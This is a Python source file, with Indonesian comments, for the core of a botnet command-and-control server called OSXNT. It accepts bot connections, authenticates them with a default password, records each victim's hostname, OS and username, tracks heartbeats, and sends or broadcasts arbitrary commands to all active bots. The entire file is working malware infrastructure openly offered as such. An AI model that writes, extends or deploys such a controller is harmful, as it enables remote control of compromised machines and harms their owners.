#!/usr/bin/env python3
# OSXNT - C2 Server Core
# Manage bot connections and commands

import socket
import threading
import json
import time
import os
import hashlib
from datetime import datetime
from lib.verbose import Verbose

class C2Server:
    """
    Core C2 Server untuk manage bot connections
    """
    
    def __init__(self, ip='0.0.0.0', port=8080, password='osxnt', verbose=False):
        """
        Inisialisasi C2 Server
        
        Args:
            ip (str): IP untuk binding
            port (int): Port untuk listening
            password (str): Password server
            verbose (bool): Mode verbose
        """
        self.ip = ip
        self.port = port
        self.password = password
        self.v = Verbose(verbose)
        
        # Data bots
        self.bots = {}          # {bot_id: bot_info}
        self.bot_sockets = {}    # {bot_id: socket}
        self.bot_id_counter = 0
        
        # Tools
        self.tools = {}          # {tool_name: tool_object}
        
        # Server status
        self.running = False
        self.server_socket = None
        
        # Command queue
        self.command_queue = []  # Queue untuk broadcast
        
        # Logs
        self.logs = []
        
        self.v.log(f"C2 Server initialized: {ip}:{port}")
    
    def start(self):
        """
        Start C2 server dan listening untuk bot connections
        """
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.ip, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            self.start_time = time.time()
            
            print(f"\n[ C2 Server Started ]")
            print(f"IP: {self.ip}")
            print(f"Port: {self.port}")
            print(f"Password: {'*' * len(self.password)}")
            print(f"Status: LISTENING")
            print("-" * 50)
            
            # Thread untuk accept connections
            accept_thread = threading.Thread(target=self._accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Thread untuk heartbeat checker
            heartbeat_thread = threading.Thread(target=self._heartbeat_checker)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()
            
            return True
            
        except Exception as e:
            self.v.error(f"Failed to start server: {e}")
            return False
    
    def _accept_connections(self):
        """
        Accept incoming bot connections
        """
        while self.running:
            try:
                client_sock, addr = self.server_socket.accept()
                self.v.log(f"Incoming connection from {addr}")
                
                # Handle di thread terpisah
                client_thread = threading.Thread(
                    target=self._handle_bot,
                    args=(client_sock, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.v.error(f"Accept error: {e}")
    
    def _handle_bot(self, sock, addr):
        """
        Handle individual bot connection
        """
        try:
            # Authentication
            if not self._authenticate_bot(sock):
                sock.close()
                return
            
            # Register bot
            bot_id = self._register_bot(sock, addr)
            if not bot_id:
                sock.close()
                return
            
            self.v.log(f"Bot {bot_id} registered from {addr}")
            
            # Main communication loop
            while self.running and bot_id in self.bots:
                try:
                    # Receive data
                    data = sock.recv(4096)
                    if not data:
                        break
                    
                    # Process message
                    self._process_bot_message(bot_id, data)
                    
                except socket.timeout:
                    # Timeout, kirim heartbeat request
                    self._send_heartbeat(bot_id)
                except Exception as e:
                    self.v.error(f"Bot {bot_id} error: {e}")
                    break
                
                time.sleep(0.1)
            
        except Exception as e:
            self.v.error(f"Error handling bot: {e}")
        finally:
            self._disconnect_bot(bot_id if 'bot_id' in locals() else None)
            sock.close()
    
    def _authenticate_bot(self, sock):
        """
        Authenticate bot dengan password
        """
        try:
            # Kirim challenge
            challenge = hashlib.md5(str(time.time()).encode()).hexdigest()
            sock.send(json.dumps({
                'type': 'auth',
                'challenge': challenge
            }).encode())
            
            # Terima response
            data = sock.recv(1024).decode()
            response = json.loads(data)
            
            # Verify password (simplified)
            expected = hashlib.md5(f"{challenge}{self.password}".encode()).hexdigest()
            if response.get('response') == expected:
                sock.send(json.dumps({'status': 'ok'}).encode())
                return True
            else:
                sock.send(json.dumps({'status': 'error', 'message': 'Auth failed'}).encode())
                return False
                
        except Exception as e:
            self.v.error(f"Auth error: {e}")
            return False
    
    def _register_bot(self, sock, addr):
        """
        Register bot baru
        """
        try:
            # Terima info bot
            data = sock.recv(4096).decode()
            bot_info = json.loads(data)
            
            # Generate bot ID
            self.bot_id_counter += 1
            bot_id = f"BOT-{self.bot_id_counter:03d}"
            
            # Simpan info bot
            self.bots[bot_id] = {
                'id': bot_id,
                'ip': addr[0],
                'port': addr[1],
                'hostname': bot_info.get('hostname', 'unknown'),
                'os': bot_info.get('os', 'unknown'),
                'username': bot_info.get('username', 'unknown'),
                'connected_at': time.time(),
                'last_seen': time.time(),
                'status': 'active',
                'tasks': []
            }
            
            self.bot_sockets[bot_id] = sock
            
            # Kirim konfirmasi
            sock.send(json.dumps({
                'type': 'register',
                'bot_id': bot_id,
                'status': 'ok'
            }).encode())
            
            # Log
            self._add_log(f"Bot {bot_id} registered", 'info')
            
            return bot_id
            
        except Exception as e:
            self.v.error(f"Register error: {e}")
            return None
    
    def _process_bot_message(self, bot_id, data):
        """
        Process message dari bot
        """
        try:
            message = json.loads(data.decode())
            msg_type = message.get('type')
            
            if msg_type == 'heartbeat':
                # Update last seen
                self.bots[bot_id]['last_seen'] = time.time()
                self.bots[bot_id]['status'] = 'active'
                
            elif msg_type == 'result':
                # Command result
                cmd_id = message.get('cmd_id')
                result = message.get('result')
                self._handle_command_result(bot_id, cmd_id, result)
                
            elif msg_type == 'status':
                # Status update
                self.bots[bot_id].update(message.get('data', {}))
                
            elif msg_type == 'error':
                # Error report
                self.v.error(f"Bot {bot_id}: {message.get('error')}")
                
        except Exception as e:
            self.v.error(f"Process message error: {e}")
    
    def _send_heartbeat(self, bot_id):
        """
        Kirim heartbeat ke bot
        """
        try:
            sock = self.bot_sockets.get(bot_id)
            if sock:
                sock.send(json.dumps({
                    'type': 'heartbeat',
                    'timestamp': time.time()
                }).encode())
        except:
            pass
    
    def _heartbeat_checker(self):
        """
        Check bot heartbeats periodically
        """
        while self.running:
            for bot_id, bot_info in list(self.bots.items()):
                last_seen = bot_info.get('last_seen', 0)
                if time.time() - last_seen > 60:  # 60 detik timeout
                    bot_info['status'] = 'inactive'
                elif time.time() - last_seen > 300:  # 5 menit
                    self._disconnect_bot(bot_id)
            
            time.sleep(30)
    
    def _disconnect_bot(self, bot_id):
        """
        Disconnect bot
        """
        if bot_id and bot_id in self.bots:
            self.bots[bot_id]['status'] = 'disconnected'
            self._add_log(f"Bot {bot_id} disconnected", 'info')
            
            if bot_id in self.bot_sockets:
                try:
                    self.bot_sockets[bot_id].close()
                except:
                    pass
                del self.bot_sockets[bot_id]
    
    def _handle_command_result(self, bot_id, cmd_id, result):
        """
        Handle command result dari bot
        """
        self._add_log(f"Command {cmd_id} result from {bot_id}", 'debug')
        # Bisa disimpan ke database nanti
    
    def _add_log(self, message, level='info'):
        """
        Add log entry
        """
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'level': level,
            'message': message
        }
        self.logs.append(log_entry)
        
        if level == 'error':
            self.v.error(message)
        elif level == 'info':
            self.v.log(message)
    
    def send_command(self, bot_id, command, data=None):
        """
        Send command ke specific bot
        """
        if bot_id not in self.bot_sockets:
            return False, "Bot not connected"
        
        try:
            cmd_msg = {
                'type': 'command',
                'command': command,
                'data': data,
                'timestamp': time.time()
            }
            
            self.bot_sockets[bot_id].send(json.dumps(cmd_msg).encode())
            self._add_log(f"Command '{command}' sent to {bot_id}", 'info')
            return True, "Command sent"
            
        except Exception as e:
            return False, str(e)
    
    def broadcast_command(self, command, data=None):
        """
        Broadcast command ke semua bot
        """
        results = []
        for bot_id in list(self.bots.keys()):
            if self.bots[bot_id]['status'] == 'active':
                success, msg = self.send_command(bot_id, command, data)
                results.append({
                    'bot_id': bot_id,
                    'success': success,
                    'message': msg
                })
        
        return results
    
    def get_stats(self):
        """
        Get server statistics
        """
        active_bots = sum(1 for b in self.bots.values() if b.get('status') == 'active')
        inactive_bots = sum(1 for b in self.bots.values() if b.get('status') == 'inactive')
        
        return {
            'uptime': time.time() - self.start_time,
            'total_bots': len(self.bots),
            'active_bots': active_bots,
            'inactive_bots': inactive_bots,
            'tools_loaded': len(self.tools),
            'port': self.port,
            'ip': self.ip
        }
    
    def stop(self):
        """
        Stop C2 server
        """
        self.running = False
        
        # Disconnect all bots
        for bot_id in list(self.bot_sockets.keys()):
            self._disconnect_bot(bot_id)
        
        if self.server_socket:
            self.server_socket.close()
        
        print("\n[ C2 Server Stopped ]")
